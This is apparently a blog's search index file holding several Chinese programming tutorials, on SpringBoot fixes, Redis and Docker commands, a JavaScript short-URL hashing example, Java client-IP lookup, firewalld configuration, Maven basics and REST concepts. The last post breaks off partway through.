<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[SpringBoot所遇到的坑]]></title>
    <url>%2F2018%2F07%2F02%2FSpringBoot%E6%89%80%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91%2F</url>
    <content type="text"><![CDATA[整合Mybatis出现A component required a bean of type ‘com.aunsetre.mapping.UserMapper’ that could not be found.SpringBoot没有找到注入的Mapper,在Main方法上加@MapperScan(“Mapper接口包名”) 页面访问controller报404错误spring没有扫描到controller层，因为springboot扫描规则是从启动类所在包开始扫描，扫描该类所在包以及子 包，如果controller层所在的包不在启动类包内，spring是无法去扫描的。 因此，最好将启动类放在最外层 读取properties文件中的中文乱码通过如下的方法 注：勾上之后，最好把文件先备份后删掉，再新建一次。建议把IDEA的编码格式都配置成UTF-8 读取数据库中的中文乱码检查数据库的字符集编码格式，改成utf8 检查数据连接的url加入characterEncoding=urf8 jdbc:mysql://127.0.0.1:3306/test?characterEncoding=utf8 返回到前端的数据乱码在配置文件中添加spring.http.encoding.force=true]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>SpringBoot</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Redis笔记（一）]]></title>
    <url>%2F2018%2F06%2F06%2FRedis%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
    <content type="text"><![CDATA[启动Redis服务器 $ src/redis-server 默认并不是在后台启动，如果你想在后台启动则需要开启守护进程 修改Redis.conf中的daemonize 设置为yes(默认是no) 再重新启动,依据配置文件启动服务器 src/redis-server url/redis.conf 关闭进程查看Redis进程，拿到pid ps -ef |grep redis 关闭进程 kill pid 对于结束不掉的进程可以使用： kill -s 9 pid Redis 键命令设置键值12redis 127.0.0.1:6379&gt; SET name redisOK 根据键取值12127.0.0.1:6379&gt; get name&quot;redis&quot; 修改Key的名称 1# RENAME key newkey 删除Key 12redis 127.0.0.1:6379&gt; DEL runoobkey(integer) 1 检查Key是否存在，存在返回1，不存在返回0 1EXISTS key 为给定 key 设置过期时间 1EXPIRE key seconds EXPIREAT 的作用和 EXPIRE 类似，都用于为 key 设置过期时间。 不同在于 EXPIREAT 命令接受的时间参数是 时间戳1EXPIREAT key timestamp 设置 key 的过期时间以毫秒计。 1PEXPIRE key milliseconds 移除Key的过期时间 1PERSIST key TYPE key 返回 key 所储存的值的类型 1TYPE key 随机返回一个Key 1RANDOMKEY 根据给定pattern筛选key 1KEYS pattern]]></content>
      <categories>
        <category>Redis</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[短链生成算法]]></title>
    <url>%2F2018%2F05%2F22%2F%E7%9F%AD%E9%93%BE%E7%94%9F%E6%88%90%E7%AE%97%E6%B3%95%2F</url>
    <content type="text"><![CDATA[何为短链短链：即一个较短的链接地址，这个链接地址通常指的是url。 为什么需要短链现而今，互联网无处不在。我们无时无刻都在上网，查看信息，分享信息。而分享信息很多时候都是通过分享链接来实现的，比如说说、日志、群聊等等。一个奇长无比链接分享出来，特别恶心人。以及微博等社交软件发表、分享通常有字数限制。此时，短链需求应运而生。 短链接的好处1、内容需要；2、用户友好；3、便于管理。 为什么要这样做的，原因我想有这样几点： 微博限制字数为140字一条，那么如果我们需要发一些连接上去，但是这个连接非常的长，以至于将近要占用我们内容的一半篇幅，这肯定是不能被允许的，所以短网址应运而生了。短网址可以在我们项目里可以很好的对开放级URL进行管理。有一部分网址可以会涵盖暴力，广告等信息，这样我们可以通过用户的举报，完全管理这个连接将不出现在我们的应用中，应为同样的URL通过加密算法之后，得到的地址是一样的。我们可以对一系列的网址进行流量，点击等统计，挖掘出大多数用户的关注点，这样有利于我们对项目的后续工作更好的作出决策。 短链原理将一个url部分冗长的信息通过哈希算法进行压缩，并建立哈希值与原链之间的映射。每当通过短链访问时，后端服务就通过短链中的哈希值找到对应的原链，然后通过请求转发或者重定向的方式转至原链接内容。 短链算法基于以上原理可知，任何一种哈希算法都可以作为短链生成的算法基础，这里给大家看到的是市面上广泛采用的基于MD5的算法。 代码示例123456789101112131415161718192021222324252627282930313233var md5 = require('./md5').md5;function getLinkShort(base,url)&#123; var key = 'alexis'; var urlhash = md5(key,url); var len = urlhash.length; var charset = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'; var shortUrlList = []; //将加密后的串分成4段，每段4字节，对每段进行计算，一共可以生成四组短连接 for (var i = 0; i &lt; 4; i++) &#123; var urlhashPiece = urlhash.substr(i * len / 4, len / 4); //将分段的位与0x3fffffff做位与，0x3fffffff表示二进制数的30个1，即30位以后的加密串都归零 var hex = parseInt(urlhashPiece,16) &amp; 0x3fffffff; //此处需要用到hexdec()将16进制字符串转为10进制数值型，否则运算会不正常 var shortUrl = base; //生成6位短连接 for (var j = 0; j &lt; 6; j++) &#123; //将得到的值与0x0000003d,3d为61，即charset的坐标最大值 shortUrl += charset.charAt(hex &amp; 0x0000003d); //循环完以后将hex右移5位 hex = hex &gt;&gt; 5; &#125; shortUrlList.push(shortUrl); &#125; return shortUrlList;&#125;console.log(getLinkShort('http://t.cn/','http://www.baidu.com')); 运行结果12345[ 'http://t.cn/vDS0KK', 'http://t.cn/vvDCO4', 'http://t.cn/b984CK', 'http://t.cn/ebfzHS' ] 可以看到上面的方法生成了四个短链，可根据需要，采取其中一个作为短链即可。]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安装Docker]]></title>
    <url>%2F2018%2F05%2F22%2F2018-1-15-%E5%AE%89%E8%A3%85Docker%2F</url>
    <content type="text"><![CDATA[环境● 操作系统 CentOS 7.2 64位● CPU 1核● 内存 1GB 安装1yum -y install docker-io 启动docker1service docker start 加入开机启动1chkconfig docker on 从docker.io中下载centos镜像到本地 /var/lib/docker/graph1docker pull centos:latest 查看已下载的镜像1docker images 启动一个容器1docker run -i -t centos /bin/bash 退出容器ctrl+d 退出容器且关闭, docker ps 查看无ctrl+p+q 退出容器但不关闭, docker ps 查看有 查看所有容器docker ps 进入容器1docker attach 44fc0f0582d9 12]]></content>
      <categories>
        <category>Docker</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[线程安全问题分析]]></title>
    <url>%2F2018%2F05%2F15%2F%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[什么是线程安全问题？从某个线程开始访问到访问结束的整个过程，如果有一个访问对象被其他线程修改，那么对于当前线程而言就发生了线程安全问题；如果在整个访问过程中，无一对象被其他线程修改，就是线程安全的。 线程安全问题产生的根本原因 首先是多线程环境，即同时存在有多个操作者，单线程环境不存在线程安全问题。在单线程环境下，任何操作包括修改操作都是操作者自己发出的，操作者发出操作时不仅有明确的目的，而且意识到操作的影响。 多个操作者（线程）必须操作同一个对象，只有多个操作者同时操作一个对象，行为的影响才能立即传递到其他操作者。 多个操作者（线程）对同一对象的操作必须包含修改操作，共同读取不存在线程安全问题，因为对象不被修改，未发生变化，不能产生影响。 综上可知，线程安全问题产生的根本原因是共享数据存在被并发修改的可能，即一个线程读取时，允许另一个线程修改。 线程安全问题解决思路根据线程安全问题产生的条件，解决线程安全问题的思路是消除产生线程安全问题的环境： 消除共享数据：成员变量与静态变量多线程共享，将这些全局变量转化为局部变量，局部变量存放在栈，线程间不共享，就不存在线程安全问题产生的环境了。消除共享数据的不足：如果需要一个对象采集各个线程的信息，或者在线程间传递信息，消除了共享对象就无法实现此目的。 使用线程同步机制：给读写操作同时加锁，使得同时只有一个线程可以访问共享数据。如果单单给写操作加锁，同时只有一个线程可以执行写操作，而读操作不受限制，允许多线程并发读取，这时就可能出现不可重复读的情况，如一个持续时间比较长的读线程，相隔较长时间读取数组同一索引位置的数据，正好在这两次读取的时间内，一个线程修改了该索引处的数据，造成该线程从同一索引处前后读取的数据不一致。是同时给读写加锁，还是只给写加锁，根据具体需求而定。同步机制的缺点是降低了程序的吞吐量。 建立副本：使用ThreadLocal为每一个线程建立一个变量的副本，各个线程间独立操作，互不影响。该方式本质上是消除共享数据思想的一种实现。]]></content>
      <tags>
        <tag>多线程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[FormData 对象的使用]]></title>
    <url>%2F2018%2F05%2F10%2FFormData%20%E5%AF%B9%E8%B1%A1%E7%9A%84%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[通过FormData对象可以组装一组用 XMLHttpRequest发送请求的键/值对。它可以更灵活方便的发送表单数据，因为可以独立于表单使用。如果你把表单的编码类型设置为multipart/form-data ，则通过FormData传输的数据格式和表单通过submit() 方法传输的数据格式相同 如何创建一个FormData对象你可以自己创建一个FormData对象，然后通过调用它的append()方法添加字段，就像这样： 1234567891011121314151617var formData = new FormData();formData.append("username", "Groucho");formData.append("accountnum", 123456); // 数字 123456 会被立即转换成字符串 "123456"// HTML 文件类型input，由用户选择formData.append("userfile", fileInputElement.files[0]);// JavaScript file-like 对象var content = '&lt;a id="a"&gt;&lt;b id="b"&gt;hey!&lt;/b&gt;&lt;/a&gt;'; // 新文件的正文...var blob = new Blob([content], &#123; type: "text/xml"&#125;);formData.append("webmasterfile", blob);var request = new XMLHttpRequest();request.open("POST", "http://foo.com/submitform.php");request.send(formData); 注意：字段 “userfile” 和 “webmasterfile” 都包含一个文件. 字段 “accountnum” 是数字类型，它将被FormData.append()方法转换成字符串类型(FormData 对象的字段类型可以是 Blob, File, 或者 string: 如果它的字段类型不是Blob也不是File，则会被转换成字符串类型。 上面的示例创建了一个FormData实例，包含”username”, “accountnum”, “userfile” 和 “webmasterfile”四个字段，然后使用XMLHttpRequest的send()方法发送表单数据。字段 “webmasterfile” 是 Blob类型。一个 Blob对象表示一个不可变的, 原始数据的类似文件对象。Blob表示的数据不一定是一个JavaScript原生格式。 File 接口基于Blob，继承 blob功能并将其扩展为支持用户系统上的文件。你可以通过 Blob() 构造函数创建一个Blob对象。 通过HTML表单创建FormData对象想要构造一个包含Form表单数据的FormData对象，需要在创建FormData对象时指定表单的元素。 1var formData = new FormData(someFormElement); 示例： 1234var formElement = document.querySelector("form");var request = new XMLHttpRequest();request.open("POST", "submitform.php");request.send(new FormData(formElement)); 你还可以在创建一个包含Form表单数据的FormData对象之后和发送请求之前，附加额外的数据到FormData对象里，像这样： 123456var formElement = document.querySelector("form");var formData = new FormData(formElement);var request = new XMLHttpRequest();request.open("POST", "submitform.php");formData.append("serialnumber", serialNumber++);request.send(formData); 这样你就可以在发送请求之前自由地附加不一定是用户编辑的字段到表单数据里 使用FormData对象上传文件你还可以使用FormData上传文件。使用的时候需要在表单中添加一个文件类型的input：12345678910&lt;form enctype="multipart/form-data" method="post" name="fileinfo"&gt; &lt;label&gt;Your email address:&lt;/label&gt; &lt;input type="email" autocomplete="on" autofocus name="userid" placeholder="email" required size="32" maxlength="64" /&gt;&lt;br /&gt; &lt;label&gt;Custom file label:&lt;/label&gt; &lt;input type="text" name="filelabel" size="12" maxlength="32" /&gt;&lt;br /&gt; &lt;label&gt;File to stash:&lt;/label&gt; &lt;input type="file" name="file" required /&gt; &lt;input type="submit" value="Stash the file!" /&gt;&lt;/form&gt;&lt;div&gt;&lt;/div&gt; 然后使用下面的代码发送请求： 123456789101112131415161718192021var form = document.forms.namedItem("fileinfo");form.addEventListener('submit', function(ev) &#123; var oOutput = document.querySelector("div"), oData = new FormData(form); oData.append("CustomField", "This is some extra data"); var oReq = new XMLHttpRequest(); oReq.open("POST", "stash.php", true); oReq.onload = function(oEvent) &#123; if (oReq.status == 200) &#123; oOutput.innerHTML = "Uploaded!"; &#125; else &#123; oOutput.innerHTML = "Error " + oReq.status + " occurred when trying to upload your file.&lt;br \/&gt;"; &#125; &#125;; oReq.send(oData); ev.preventDefault();&#125;, false); 注意：如果FormData对象是通过表单创建的，则表单中指定的请求方式会被应用到方法open()中 。 你还可以直接向FormData对象附加File或Blob类型的文件，如下所示： 1data.append("myfile", myBlob, "filename.txt"); 使用append()方法时，可以通过第三个可选参数设置发送请求的头 Content-Disposition 指定文件名。如果不指定文件名（或者不支持该参数时），将使用名字“blob”。 如果你设置正确的配置项，你也可以通过jQuery来使用FormData对象： 12345678var fd = new FormData(document.querySelector("form"));fd.append("CustomField", "This is some extra data");$.ajax(&#123; url: "stash.php", type: "POST", data: fd, processData: false, // 不处理数据 contentType: false // 不设置内容类型 通过AJAX提交表单和上传文件可以不使用FormData对象如果你想知道不使用FormData对象的情况下，通过AJAX序列化和提交表单 请点击这里。 相关链接 Using XMLHttpRequest HTMLFormElement Blob Typed Arrays]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>AJAX</tag>
        <tag>FormData</tag>
        <tag>Forms</tag>
        <tag>XMLHttpRequest</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java获取客户端真实IP]]></title>
    <url>%2F2018%2F05%2F05%2Fjavaweb%E8%8E%B7%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%9C%9F%E5%AE%9Eip%2F</url>
    <content type="text"><![CDATA[在安全性要求较高的web项目中，我们经常有这样的需求: 黑名单：禁止指定ip访问。 白名单：允许指定ip访问。 根据ip追踪恶意入侵系统者。 在Java中我们通常可以这样获取客户端ip地址： 1request.getRemoteAddr(); 但是这个方法有个弊端，就是如果对方使用了反向代理，那么这个方法获取到的永远都是反向代理服务器的ip，而并非用户的真实ip。这样也能达到禁止访问的目的，但是对于已经发生的恶意入侵，我们却无法定位到真实的用户主机。 当你遇到类似的问题时，那么下面的代码就能够很好的帮助你。 1234567891011121314151617public static String getClientIP(HttpServletRequest request) &#123; String ip = request.getHeader("X-Forwarded-For"); if (StringUtils.isNotEmpty(ip) &amp;&amp; !"unKnown".equalsIgnoreCase(ip)) &#123; // 多次反向代理后会有多个ip值，第一个ip才是真实ip int index = ip.indexOf(","); if (index != -1) &#123; return ip.substring(0, index); &#125; else &#123; return ip; &#125; &#125; ip = request.getHeader("X-Real-IP"); if (StringUtils.isNotEmpty(ip) &amp;&amp; !"unKnown".equalsIgnoreCase(ip)) &#123; return ip; &#125; return request.getRemoteAddr();&#125;]]></content>
      <categories>
        <category>Java</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Linux进程管理相关命令详述]]></title>
    <url>%2F2018%2F05%2F01%2Fcentos%2F</url>
    <content type="text"><![CDATA[在 CentOS 7 中，引入了一个新的服务，Firewalld，下面一张图，让大家明确的了解防火墙 Firewall 与 iptables 之间的关系与区别。 安装它，只需 yum install firewalld 如果需要图形界面的话，则再安装 yum install firewall-config 介绍防火墙守护 firewalld 服务引入了一个信任级别的概念来管理与之相关联的连接与接口。它支持 ipv4 与 ipv6，并支持网桥，采用 firewall-cmd (command) 或 firewall-config (gui) 来动态的管理 kernel netfilter 的临时或永久的接口规则，并实时生效而无需重启服务。 zone drop: 丢弃所有进入的包，而不给出任何响应 block: 拒绝所有外部发起的连接，允许内部发起的连接 public: 允许指定的进入连接 external: 同上，对伪装的进入连接，一般用于路由转发 dmz: 允许受限制的进入连接 work: 允许受信任的计算机被限制的进入连接，类似 workgroup home: 同上，类似 homegroup internal: 同上，范围针对所有互联网用户 trusted: 信任所有连接 过滤规则 source: 根据源地址过滤 interface: 根据网卡过滤 service: 根据服务名过滤 port: 根据端口过滤 icmp-block: icmp 报文过滤，按照 icmp 类型配置 masquerade: ip 地址伪装 forward-port: 端口转发 rule: 自定义规则 其中，过滤规则的优先级遵循如下顺序 1.source2.interface3.firewalld.conf 使用方法systemctl start firewalld # 启动, systemctl enable firewalld # 开机启动 systemctl stop firewalld # 关闭 systemctl disable firewalld # 取消开机启动 具体的规则管理，可以使用firewall-cmd ，具体的使用方法可以 $ firewall-cmd --help zone=NAME # 指定 zone permanent # 永久修改，--reload 后生效 timeout=seconds # 持续效果，到期后自动移除，用于调试，不能与 --permanent 同时使用 查看规则查看运行状态 $ firewall-cmd --state 查看已被激活的 Zone 信息 $ firewall-cmd --get-active-zones public interfaces: eth0 eth1 查看指定接口的 Zone 信息 $ firewall-cmd --get-zone-of-interface=eth0 public 查看指定级别的接口 $ firewall-cmd --zone=public --list-interfaces eth0 查看指定级别的所有信息，譬如 public $ firewall-cmd --zone=public --list-all public (default, active) interfaces: eth0 sources: services: dhcpv6-client http ssh ports: masquerade: no forward-ports: icmp-blocks: rich rules: 查看所有级别被允许的信息 $ firewall-cmd --get-service 查看重启后所有 Zones 级别中被允许的服务，即永久放行的服务 $ firewall-cmd --get-service --permanent 管理规则firewall-cmd --panic-on # 丢弃 firewall-cmd --panic-off # 取消丢弃 firewall-cmd --query-panic # 查看丢弃状态 firewall-cmd --reload # 更新规则，不重启服务 firewall-cmd --complete-reload # 更新规则，重启服务 添加某接口至某信任等级，譬如添加 eth0 至 public，永久修改 firewall-cmd --zone=public --add-interface=eth0 --permanent 设置 public 为默认的信任级别 firewall-cmd --set-default-zone=public 管理端口 列出 dmz 级别的被允许的进入端口 firewall-cmd --zone=dmz --list-ports 允许 tcp 端口 8080 至 dmz 级别 firewall-cmd --zone=dmz --add-port=8080/tcp 允许某范围的 udp 端口至 public 级别，并永久生效 firewall-cmd --zone=public --add-port=5060-5059/udp --permanent 网卡接口 列出 public zone 所有网卡 firewall-cmd --zone=public --list-interfaces 将 eth0 添加至 public zone，永久 firewall-cmd --zone=public --permanent --add-interface=eth0 eth0 存在与 public zone，将该网卡添加至 work zone，并将之从 public zone 中删除 firewall-cmd --zone=work --permanent --change-interface=eth0 删除 public zone 中的 eth0，永久 firewall-cmd --zone=public --permanent --remove-interface=eth0 管理服务 添加 smtp 服务至 work zone firewall-cmd --zone=work --add-service=smtp 移除 work zone 中的 smtp 服务 firewall-cmd --zone=work --remove-service=smtp 配置 external zone 中的 ip 地址伪装 查看 firewall-cmd --zone=external --query-masquerade 打开伪装 firewall-cmd --zone=external --add-masquerade 关闭伪装 firewall-cmd --zone=external --remove-masquerade 配置 public zone 的端口转发 要打开端口转发，则需要先 firewall-cmd --zone=public --add-masquerade 然后转发 tcp 22 端口至 3753 firewall-cmd --zone=public --add-forward-port=port=22:proto=tcp:toport=3753 转发 22 端口数据至另一个 ip 的相同端口上 firewall-cmd --zone=public --add-forward-port=port=22:proto=tcp:toaddr=192.168.1.100 转发 22 端口数据至另一 ip 的 2055 端口上 firewall-cmd --zone=public --add-forward-port=port=22:proto=tcp:toport=2055:toaddr=192.168.1.100 配置 public zone 的 icmp 查看所有支持的 icmp 类型 firewall-cmd --get-icmptypes destination-unreachable echo-reply echo-request parameter-problem redirect router-advertisement router-solicitation source-quench time-exceeded 列出 firewall-cmd --zone=public --list-icmp-blocks 添加 echo-request 屏蔽 firewall-cmd --zone=public --add-icmp-block=echo-request [--timeout=seconds] 移除 echo-reply 屏蔽 firewall-cmd --zone=public --remove-icmp-block=echo-reply IP 封禁 firewall-cmd --permanent --add-rich-rule=&quot;rule family=&apos;ipv4&apos; source address=&apos;222.222.222.222&apos; reject&quot;]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>CentOS</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Maven知识点整理]]></title>
    <url>%2F2018%2F04%2F10%2FMaven%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86%2F</url>
    <content type="text"><![CDATA[1.maven常用构建命令(了解) mvn -v:查看maven的版本。 mvn compile:编译项目。项目经过编译后会在根目录下生成一个target包(跟src包在同一目录下)，里面保存的是编译项目时字节码文件和测试报告。 mvn test:测试。此命令在项目目录下 mvn package:打包我们的项目。 mvn clean:删除上述经过编译后生成的target包。 mvn install:将我们的项目打包到本地仓库中。例如将A项目用该命令打包到本地仓库后，就可以在B项目的pom.xml文件中配置A项目的坐标来让B项目引用A项目，见下文仓库的讲解。 只有第一个命令mvn -v是在根目录下执行，其他5个命令都是在我们的maven项目包下执行的。 上述知识只做了解，在实际开发中基本没有用到上述命令。 2.maven自动构件骨架我在创建第一个Maven项目中就有介绍过，让maven自动为我们的项目生成一个标准的骨架有两种方式，一种是通过命令行输入: 1mvn archetype:generate -DgroupId=cn.codingxiaxw.helloword -DartifactId=helloworld -Dpackage=cn.codingxiaxw.helloword -Dversion=1.0-SNAPSHOT -DarchetypeArtifactId=maven-archetype-quickstart 或者: 1mvn archetype:generate -DgroupId=cn.codingxiaxw.helloword -DartifactId=helloworld -Dpackage=cn.codingxiaxw.helloword -Dversion=1.0-SNAPSHOT -DarchetypeArtifactId=maven-archetype-webapp 第二种方式是使用IDEA开发工具为我们生成，步骤之前讲过，大家可以点击上述链接看我在那篇文章中的介绍。这里只对上述命令进行解释，如下: mvn:表示使用的是maven命令。 archetype:generate:表示使用generate这个插件为我们的maven项目自动生成一个maven骨架，即我们项目的工程结构(如下图)。后边跟的是该插件为我们创建工程结构所需要的一连串的参数。 -DgroupId:标识项目的坐标元素之一，与DartifactId,Dpackaging,Dversion组成我们maven项目的坐标，四者唯一确定一个项目。它的值为我们的项目包名，我这里的格式用的我的博客网站后缀+我的用户名+项目名组成。 -DartifactId:标识项目的坐标元素之一，它的值为我们的项目名。我这里指定我要生成的项目名为helloword。 -Dpackage:标识项目的坐标元素之一,这里值就跟DgroupId的值保持一致即可。此属性在命令行中可选。 -Dversion:指定版本号。此属性在命令行中可选 -DarchetypeArtifactId:表示我们生成的工程结构为哪一种，这里的属性值为maven-archetype-quickstart表示生成工程目录结构为quickstart的结构。其值还可以为maven-archetype-webapp表示生成的工程目录结构为webapp型的结构。 3.maven中的坐标和仓库3.1坐标在maven的世界中，maven以构件来组成基本的控制单元，而定义这个构件的标示，maven给定义为“坐标”。坐标是maven最基本的概念，它就像每个构件的身份证号码，有了它我们就可以在数以千万计的构件中定位任何一个我们感兴趣的构件。 例如我们在上篇文章中通过maven命令生成的maven项目中，其pom.xml中有这样一些配置: 1234&lt;groupId&gt;cn.codingxiaxw.helloword&lt;/groupId&gt;&lt;artifactId&gt;helloword&lt;/artifactId&gt;&lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;packaging&gt;jar&lt;/packaging&gt; 上面这样四个xml元素即即组成了一个坐标，唯一标识我们创建的这个项目。 再如若我们要在自己的项目中引入junit测试jar包，只需在pom.xml中配置如下junit的坐标: 123456&lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;4.8.2&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt;&lt;/dependency&gt; maven就会根据我们给出的junit的坐标在其中央仓库中为我们找到junit 的相关jar包，然后将其下载到自己的本地仓库中。这样我们便可以在自己的项目开发中运用junit类进行测试了。 3.2仓库上述我们已经提到了仓库，其实当我们在自己的电脑上成功安装maven后，就已经已经生成了一个本地仓库，可以在下列地址中找到: 1/Users/codingBoy/.m2/repository 打开后发现里面全是各种本地仓库中的各种引用开发jar包，这里也能发现我们在pom.xml中配置的junit，可以发现已经下载到本地仓库里面了，如下: 只要我们在pom.xml中配置了相关jar包的坐标，maven都会根据这个坐标自动将这些jar包下载在该目录(也就是maven的本地仓库)下供我们开发过程中的直接引用。 既然有本地仓库，那么是不是还有个远程仓库的概念呢？答案是肯定的，这个远程仓库是个大仓库，叫做中央仓库，地址为:https://repo.maven.apache.org/maven2。感谢开源社区的贡献，在maven的中央仓库里几乎为我们下载了所有开发都需要的jar包，如下: 要是此时我们又创建了一个maven项目helloword2，而且需要在这个项目中引用helloword项目，只要将helloword项目打包到本地仓库，然后在helloword2项目的pom.xml文件中引入helloword的坐标即可。通过如下步骤: 1.在命令行中输入命令: 123先cd helloword然后mvn clean 通过上述步骤清除helloword经过编译后生成的target包。 2.输入: 1mvn install 将helloword项目打包并发布到本地仓库中。 3.此时helloword2就可以根据坐标来引入helloword项目了，在helloword2的pom.xml文件中添加helloword的坐标: 123456&lt;dependency&gt; &lt;groupId&gt;cn.codingxiaxw.helloword&lt;/groupId&gt; &lt;artifactId&gt;helloword&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;packaging&gt;jar&lt;/packaging&gt;&lt;/dependency&gt; 这样便完成了在一个项目中对另一个项目进行引用。 3.3坐标和仓库的关系有了坐标，就知道在什么位置存储构件的内容，中央仓库也是一个样，上述例子中引用的junit的可以把它的坐标描述为：junit:junit:4.8.2，在中央仓库地址中打开对应的目录果然看到了Junit的jar包: 有了正确的坐标,Maven才能够在正确的位置找到依赖文件并使用，上述pom.xml中为junit坐标设置的&lt;scope&gt;标签中的test值是用来控制该依赖只在测试时可用，与坐标无关。 正因为坐标是Maven核心的核心，因此规划正确的坐标至关重要，如果你使用了模糊不清的坐标，那么你的用户就很难找到你的构件，或者即使找到了，也容易写错。错误的使用坐标，还会造成冲突，如果你也使用junit这样的groupId，那就悲剧了。 4.生命周期和插件Maven定义了三套生命周期：clean、default、site，每个生命周期都包含了一些阶段（phase）。三套生命周期相互独立，但各个生命 周期中的phase却是有顺序的，且后面的phase依赖于前面的phase。执行某个phase时，其前面的phase会依顺序执行，但不会触发另外两 套生命周期中的任何phase。 clean，做些清理的工作。 default，最核心的周期，做初始化和构建的工作，里面分的阶段很多，主要是compllie,test, package, install等。 site，生成站点的周期，包括生成文档和发布等。 maven的生命周期是抽象的，实际需要插件来完成任务，这一过程是通过将插件的目标（goal）绑定到生命周期的具体阶段（phase）来完成的。这里就像设计模式中的模板模式，父类定义好了方法模板并规定对了执行顺序，而子类定义了每个模板方法具体要做的事情。这里的父类相当于maven，而子类就像是一个个的插件。 比如compile这个阶段，对应的是mvn complie这个命令，但是实际上是maven-compiler-plugin这个插件在起作用。 而install这个阶段,对应的mvn install命令，实际上是maven-install-plugin这个插件在起作用。 5.总结在实际开发中，我们用到Maven对我们的项目进行管理的地方，就是通过在pom.xml文件中添加所需第三方jar包的坐标让maven在中央仓库中找到相应的jar包资源然后下载到本地仓库中为我们使用。有了maven以后，我们在用到第三方jar包时就不需要再去网上找相关的jar包进行下载及导入到path环境中，maven为我们的项目开发进行了很好的管理。]]></content>
      <tags>
        <tag>maven</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RESTful架构详解]]></title>
    <url>%2F2018%2F04%2F10%2FRESTful%E6%9E%B6%E6%9E%84%2F</url>
    <content type="text"><![CDATA[越来越多的人开始意识到，网站即软件，而且是一种新型的软件。 这种”互联网软件”采用客户端/服务器模式，建立在分布式体系上，通过互联网通信，具有高延时（high latency）、高并发等特点。 网站开发，完全可以采用软件开发的模式。但是传统上，软件和网络是两个不同的领域，很少有交集；软件开发主要针对单机环境，网络则主要研究系统之间的通信。互联网的兴起，使得这两个领域开始融合，现在我们必须考虑，如何开发在互联网环境中使用的软件。 RESTful架构，就是目前最流行的一种互联网软件架构。它结构清晰、符合标准、易于理解、扩展方便，所以正得到越来越多网站的采用。 但是，到底什么是RESTful架构，并不是一个容易说清楚的问题。下面，我就谈谈我理解的RESTful架构。 起源REST这个词，是Roy Thomas Fielding在他2000年的博士论文中提出的。 Fielding是一个非常重要的人，他是HTTP协议（1.0版和1.1版）的主要设计者、Apache服务器软件的作者之一、Apache基金会的第一任主席。所以，他的这篇论文一经发表，就引起了关注，并且立即对互联网开发产生了深远的影响。 他这样介绍论文的写作目的： “本文研究计算机科学两大前沿—-软件和网络—-的交叉点。长期以来，软件研究主要关注软件设计的分类、设计方法的演化，很少客观地评估不同的设计选择对系统行为的影响。而相反地，网络研究主要关注系统之间通信行为的细节、如何改进特定通信机制的表现，常常忽视了一个事实，那就是改变应用程序的互动风格比改变互动协议，对整体表现有更大的影响。我这篇文章的写作目的，就是想在符合架构原理的前提下，理解和评估以网络为基础的应用软件的架构设计，得到一个功能强、性能好、适宜通信的架构。“ (This dissertation explores a junction on the frontiers of two research disciplines in computer science: software and networking. Software research has long been concerned with the categorization of software designs and the development of design methodologies, but has rarely been able to objectively evaluate the impact of various design choices on system behavior. Networking research, in contrast, is focused on the details of generic communication behavior between systems and improving the performance of particular communication techniques, often ignoring the fact that changing the interaction style of an application can have more impact on performance than the communication protocols used for that interaction. My work is motivated by the desire to understand and evaluate the architectural design of network-based application software through principled use of architectural constraints, thereby obtaining the functional, performance, and social properties desired of an architecture. ) 名称Fielding将他对互联网软件的架构原则，定名为REST，即Representational State Transfer的缩写。我对这个词组的翻译是”表现层状态转化”。 如果一个架构符合REST原则，就称它为RESTful架构。 要理解RESTful架构，最好的方法就是去理解Representational State Transfer这个词组到底是什么意思，它的每一个词代表了什么涵义。如果你把这个名称搞懂了，也就不难体会REST是一种什么样的设计。 资源（Resources）REST的名称”表现层状态转化”中，省略了主语。”表现层”其实指的是”资源”（Resources）的”表现层”。 所谓”资源”，就是网络上的一个实体，或者说是网络上的一个具体信息。它可以是一段文本、一张图片、一首歌曲、一种服务，总之就是一个具体的实在。你可以用一个URI（统一资源定位符）指向它，每种资源对应一个特定的URI。要获取这个资源，访问它的URI就可以，因此URI就成了每一个资源的地址或独一无二的识别符。 所谓”上网”，就是与互联网上一系列的”资源”互动，调用它的URI。 表现层（Representation“资源”是一种信息实体，它可以有多种外在表现形式。我们把”资源”具体呈现出来的形式，叫做它的”表现层”（Representation）。 比如，文本可以用txt格式表现，也可以用HTML格式、XML格式、JSON格式表现，甚至可以采用二进制格式；图片可以用JPG格式表现，也可以用PNG格式表现。 URI只代表资源的实体，不代表它的形式。严格地说，有些网址最后的”.html”后缀名是不必要的，因为这个后缀名表示格式，属于”表现层”范畴，而URI应该只代表”资源”的位置。它的具体表现形式，应该在HTTP请求的头信息中用Accept和Content-Type字段指定，这两个字段才是对”表现层”的描述。 状态转化（State 